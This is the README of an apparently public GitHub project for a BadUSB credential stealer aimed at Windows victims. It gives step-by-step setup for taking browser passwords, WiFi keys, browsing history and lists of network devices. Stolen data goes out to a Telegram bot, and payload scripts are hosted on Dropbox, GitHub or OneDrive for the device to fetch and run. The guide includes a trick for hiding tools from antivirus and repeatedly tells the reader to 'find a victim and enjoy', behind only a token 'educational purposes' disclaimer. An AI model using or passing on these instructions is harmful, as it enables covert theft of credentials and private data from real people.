# BadUSB_passStealer
# Warning ⚠️
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**.
# About ℹ️
This **script** allows you to steal the following **information** :
* Browser **passwords** (Chrome, Firefox, Opera);
* **WiFi** passwords;
* Browser **history** from the last 7 days;
* The list of all **devices** that are **connected to victim's network**;
### Pay attention Arduino users !
I stopped upgrading .ino scripts, if you want you can convert Ducky Scripts [here](https://duckify.huhn.me/).
### NB n°1 (for arduino BadUSB)
Sometimes, you will see something like this : 
``` 
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll(); 
```
This is only to write these characters : "@", "\\". But it depends on the computer's layout, so adapt these characters thanks to this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to wirte these characters with your keyboard. (or switch the keyboard layout to French).
### US Layout
For US layout you only have to replace by this for "\\" :
```
Keyboard.press(92);
Keyboard.releaseAll();
```
And by this for "@" :
```
Keyboard.press(64);
Keyboard.releaseAll();
```
### NB n°2
You can customize the **delay** according to the speed in which you plug the **BadUSB**.
### NB n°3
When you plug the BadUSB in a PC you  have to wait for the caps lock to flash to unplug it.
# Getting Started ✔️
## Requirments
1. Have a **BadUSB**.

2. Install **Arduino software** [here](https://www.arduino.cc/en/software) (if you use a BadUSB which is based on arduino);

3. Have a Telegram account;

4. Have latest version of python installed on your PC;

5. Have latest version of pip installed on your PC;

6. Have a victim with **Windows OS** installed in his PC;
# Install latest version of Python and Pip
## Python
1. Download latest python version (installer 64-bit or 32-bit) [here](https://www.python.org/downloads/windows/);
2. Now run the installer
3. Select "Add python.exe to PATH" checkbox and then click on "install now";
## Pip
1. Launch a powershell prompt and run the following command to download get-pip.py :
```
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
```
2. Then run the following command to install pip :
```
python get-pip.py
```
# Setup a telegram bot to upload files (only for Rubber Ducky, Malduino W and Arduino users)
## Create a telegram bot
1. Open you browser and go to this [link](https://web.telegram.org/) and login;

2. Search for the @BotFather username in your Telegram search bar;

3. Click Start to begin a conversation with @BotFather

4. Send /newbot to @BotFather.;

5. Then send your bot’s name to @BotFather.;

6. Then send your bot’s username to @BotFather. @BotFather will respond :
> Done! Congratulations on your new bot. You will find it at t.me/BOT_USERNAME. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you’ve finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this. 
Use this token to access the HTTP API:
API_ACESS_TOKEN
For a description of the Bot API, see this page: https://core.telegram.org/bots/api

7. Now begin a conversation with your bot by clicking on the t.me/BOT_USERNAME link in @BotFather's  and click Start. Now your bot will appear in your chat list;
## Get a Telegram API access token
Your Telegram API access token is in the @BotFather's response !
## Get your Telegram chat ID
1. Paste the following link in your browser. Replace API_ACCESS_TOKEN with the API access token that you identified or created in the previous section :
```
https://api.telegram.org/bot<API-access-token>/getUpdates?offset=0
```

2. Send a message to your bot in the Telegram application. The message text can be anything. Your chat history must include at least one message to get your chat ID.

3. Refresh the API tab.

4. Identify the numerical chat ID by finding the id inside the chat JSON object. In the example below, the chat ID is 123456789.
```
"message":{"message_id":2,"from":{"id":123456789,"is_bot":false,"first_name":"user","language_code":"en"},"chat":{"id":123456789,"first_name":"user","type":"private"},"date":1696077493,"text":"Hi"}}]}
```
## Install for Rubber Ducky, Malduino W and Arduino BadUSB
1. Download this repository;

**Linux :**
```
git clone https://github.com/tuconnaisyouknow/BadUSB_passStealer
cd BadUSB_passStealer
```
**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.

2. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/telegram_uploader.py) at line 7 and 8;

3. Convert telegram_uploader.py in exe file with this command :
```
pip install pyinstaller
pyinstaller --onefile -w telegram_uploader.py
```

4. [Upload](https://github.com/tuconnaisyouknow/BadUSB_passStealer#how-to-set-a-link-for-wget-the-script-%EF%B8%8F) your files (ciaoV2_upload.ps1, fin_upload.ps1, telegram_uploader.exe) to download them;

5. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt) with ciaoV2_upload.ps1 link at line 53;

6. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/ciaoV2_upload.ps1) with telegram_uploader.exe at line 15;

7. Put the .ino or .txt file in your **BadUSB**;

8. Find a victim and enjoy !
## Install for Malduino 2 BadUSB (with mass storage)
### **NB** : You can upgrade firmware also on Malduino 1 !
### **NB 2** : MMS = Malduino Mass Storage
1. Download this repository;

**Linux :**
```
git clone https://github.com/tuconnaisyouknow/BadUSB_passStealer
cd BadUSB_passStealer
```
**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.

2. Upgrade Malduino firmware following this [istructions](https://docs.maltronics.com/devices/malduino-2/firmware-upgrade);

3. Then replace false with true at line 2 in preferences.json file in your MMS. The line has to be like the following :
```
"enable_msc": true,
```

4. In your MMS root directory, crate the following 2 directory : dump/ and passStealer/;

5. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/telegram_uploader.py) at line 7 and 8;

6. Convert telegram_uploader.py in exe file with this command :
```
pip install pyinstaller
pyinstaller --onefile -w telegram_uploader.py
```

7. Download 7-Zip Extra: standalone console version, 7z DLL, Plugin for Far Manager [here](https://www.7-zip.org/download.html)

8. Put BadUSB_passStealer.txt in the root directory of your MMS, ciaoV2_storage.ps1 in MMS/passStealer/, fin_storage.ps1 in MMS/passStealer, 7z/ in MMS/passStealer and tools.zip (password : tools) in MMS/passStealer;

9. Find a victim and enjoy !;
**Explaination** : Nirsoft Tools are encrypted with a password to not be detected by antivirus, so we need 7zip to extract this zip in command line. Dump folder is where all stolen informations will be.
## Requirments for victim PC (not if you use malduino 2 firmware)
* Turn off caps lock.
* Switch the keyboard layout to French (or adapt the code according to your layout).
# How to set a link for wget the script ⬇️
## Dropbox
1. Create a dropbox account [here](https://www.dropbox.com);

2. Upload your file;

3. Copy the link of the file and change ?dl=0 by ?dl=1;

4. You will get a link like this : https://dropbox.com/s/link/YOURFILE?dl=1;

5. Now put this link in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt) file;
## Github
1. Create a Github account [here](https://github.com/signup);

2. Create a public repository;

3. Upload your file;

4. Go to your file page and click on RAW button;

5. Copy the RAW page link and put it in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt) file;
## One Drive
1. Create a One Drive account [here](https://signup.live.com/signup);

2. Upload your file file;

3. Follow this [tutorial](https://mangolassi.it/topic/19276/how-to-configure-a-onedrive-file-for-use-with-wget)

4. Put the link you got in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt)
# Nirsoft tools 🧰
You can download nirsoft tools below if you want :
* [WebBrowserPassView.exe](https://www.nirsoft.net/protected_downloads/passreccommandline.zip) (User : download ; Password : nirsoft123!;
* [WNetWatcher.exe](https://www.nirsoft.net/utils/wireless_network_watcher.html);
* [BrowsingHistoryView.exe](https://www.nirsoft.net/utils/browsing_history_view.html);
* [WirelessKeyView.exe](https://www.nirsoft.net/utils/wireless_key.html);
